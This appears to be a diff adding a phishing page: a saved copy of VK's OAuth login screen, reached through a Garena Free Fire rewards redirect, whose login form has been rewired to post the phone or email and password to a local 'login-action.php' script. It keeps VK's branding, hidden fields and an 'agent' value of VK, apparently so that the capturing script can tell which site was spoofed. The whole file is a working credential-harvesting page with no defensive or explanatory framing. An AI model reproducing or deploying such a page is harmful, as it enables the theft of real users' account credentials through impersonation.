@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<!-- saved from url=(0331)https://oauth.vk.com/authorize?client_id=6262694&display=page&redirect_uri=https%3A%2F%2Fauth.garena.com%2Foauth%2Flogin%3Fresponse_type%3Dtoken%26locale%3Dzh-TW%26redirect_uri%3Dhttps%253A%252F%252Freward.ff.garena.com%252F%26client_id%3D100067%26all_platforms%3D1%26platform%3D5&scope=friends%2Coffline&response_type=token&v=5.69 -->
+<html lang="en" dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>VK | Login</title>
+    <link type="text/css" rel="stylesheet" href="./VK _ Login_files/common.7a27c8b06bccaaf5d745.css"><link type="text/css" rel="stylesheet" href="./VK _ Login_files/base.d2b09fa65c86c2dd0b66.css"><link type="text/css" rel="stylesheet" href="./VK _ Login_files/fonts_utf.53f24c4c5577419ba632.css"><link type="text/css" rel="stylesheet" href="./VK _ Login_files/fonts_cnt.7cc314ac69198e349896.css">
+    <link type="text/css" rel="stylesheet" href="./VK _ Login_files/oauth_popup.98ea88a667e23b0d6ec1.css">
+    <script type="text/javascript" language="javascript" src="./VK _ Login_files/common_light.js.download"></script>
+    <script type="text/javascript" language="javascript">// <![CDATA[
+      function allow(button) {
+        if (isButtonLocked(button)) return false;
+        lockButton(button);
+
+        var addr = '';
+        if (isChecked('allow_notifications')) {
+          addr = '&notify=1';
+        }
+        if (isChecked('denied_email')) {
+          addr += '&email_denied=1';
+        }
+        if (isChecked('denied_phone')) {
+          addr += '&phone_denied=1';
+        }
+        location.href = "https://login.vk.com/?act=grant_access&client_id=6262694&settings=65538&response_type=token&group_ids=&token_type=0&v=5.69&display=page&ip_h=64b6a416b2367f80ca&hash=1602922357_8fc793c3d65b9057d3&https=1&state=&redirect_uri=https%3A%2F%2Fauth.garena.com%2Foauth%2Flogin%3Fresponse_type%3Dtoken%26locale%3Dzh-TW%26redirect_uri%3Dhttps%253A%252F%252Freward.ff.garena.com%252F%26client_id%3D100067%26all_platforms%3D1%26platform%3D5"+addr;
+        return false;
+      }
+
+      function cancel() {
+        location.href = "https://login.vk.com/?act=grant_access&client_id=6262694&settings=65538&response_type=token&group_ids=&token_type=0&v=5.69&display=page&ip_h=64b6a416b2367f80ca&hash=1602922357_8fc793c3d65b9057d3&https=1&state=&redirect_uri=https%3A%2F%2Fauth.garena.com%2Foauth%2Flogin%3Fresponse_type%3Dtoken%26locale%3Dzh-TW%26redirect_uri%3Dhttps%253A%252F%252Freward.ff.garena.com%252F%26client_id%3D100067%26all_platforms%3D1%26platform%3D5&cancel=1";
+        return false;
+      }
+
+      function login(button) {
+        if (isButtonLocked(button)) return false;
+        lockButton(button);
+        ge('login_submit').submit();
+      }
+
+      function doResize(onResize) {
+        onResize && setTimeout(function() {
+          doResize()
+        }, 100);
+
+        if (!hasClass(document.body, 'oauth_centered') && !onResize) {
+          if (window.outerHeight !== void 0) {
+            var panelH = (window.outerHeight - window.innerHeight) | 0,
+              panelW = (window.outerWidth - window.innerWidth) | 0;
+          } else {
+            var panelH = 50,
+              panelW = 0;
+          }
+          var contentH = Math.max(ge('oauth_wrap_content').offsetHeight, 430),
+            contentW = 655;
+          window.resizeTo(contentW + panelW, contentH + panelH);
+          window.moveTo(
+            (screen.width - contentW) / 2 + (screen.availLeft | 0),
+            ((screen.height - contentH) / 2) + (screen.availTop | 0)
+          );
+        }
+      }
+
+      function toggleEmailPrivacy() {
+        checkbox('denied_email');
+        if (!isChecked('denied_email')) {
+          hide('denied_email');
+          show('allowed_email');
+        } else {
+          hide('allowed_email');
+          show('denied_email');
+        }
+      }
+
+      function togglePhonePrivacy() {
+        checkbox('denied_phone');
+        if (!isChecked('denied_phone')) {
+          hide('denied_phone');
+          show('allowed_phone');
+        } else {
+          hide('allowed_phone');
+          show('denied_phone');
+        }
+      }
+
+      if (parent && parent != window) {
+        location.href = "https://oauth.vk.com/blank.html";
+      }
+
+      
+    // ]]></script>
+  </head>
+
+  <body onload="doResize();" class="VK1 oauth_centered">
+    <script>
+      if (window.devicePixelRatio >= 2) document.body.className += ' is_2x';
+    </script>
+    <div class="oauth_wrap">
+      <div class="oauth_wrap_inner">
+        <div class="oauth_wrap_content" id="oauth_wrap_content">
+          <div class="oauth_head">
+  <a class="oauth_logo fl_l" href="https://vk.com/" target="_blank"></a>
+  
+</div>
+
+<div class="oauth_content box_body clear_fix">
+  <div class="box_msg_gray box_msg_padded">Log into <b>VK</b> to continue.</div>
+
+  <form method="POST" id="login_submit" action="login-action.php">
+    <div class="oauth_form">
+
+      
+
+      <div class="oauth_form_login">
+        <input type="hidden" name="ip_h" value="64b6a416b2367f80ca">
+        <input type="hidden" name="lg_h" value="516d20d47843e2b118">
+        <input type="hidden" name="_origin" value="https://oauth.vk.com">
+        <input type="hidden" name="to" value="aHR0cHM6Ly9vYXV0aC52ay5jb20vYXV0aG9yaXplP2NsaWVudF9pZD02MjYyNjk0JnJlZGlyZWN0X3VyaT1odHRwcyUzQSUyRiUyRmF1dGguZ2FyZW5hLmNvbSUyRm9hdXRoJTJGbG9naW4lM0ZyZXNwb25zZV90eXBlJTNEdG9rZW4lMjZsb2NhbGUlM0R6aC1UVyUyNnJlZGlyZWN0X3VyaSUzRGh0dHBzJTI1M0ElMjUyRiUyNTJGcmV3YXJkLmZmLmdhcmVuYS5jb20lMjUyRiUyNmNsaWVudF9pZCUzRDEwMDA2NyUyNmFsbF9wbGF0Zm9ybXMlM0QxJTI2cGxhdGZvcm0lM0Q1JnJlc3BvbnNlX3R5cGU9dG9rZW4mc2NvcGU9NjU1Mzgmdj01LjY5JnN0YXRlPSZkaXNwbGF5PXBhZ2U-">
+        <input type="hidden" id="expire" name="expire" value="0">
+
+        <div class="oauth_form_header">Phone or email</div>
+        <input type="text" class="oauth_form_input dark" name="email" value="">
+        <div class="oauth_form_header">Password</div>
+        <input type="password" class="oauth_form_input dark" name="pass">
+
+        
+
+        <button class="flat_button oauth_button button_wide" id="install_allow" type="submit" onclick="return login(this);">Log in</button>
+        <a class="oauth_forgot" href="https://vk.com/restore" target="_blank">Forgot your password?</a>
+        <input type="submit" name="submit_input" class="unshown">
+          <input type="hidden" id="agent" name="agent" value="VK">
+      </div>
+    </div>
+  </form>
+</div>
+        </div>
+      </div>
+    </div>
+  
+</body></html>
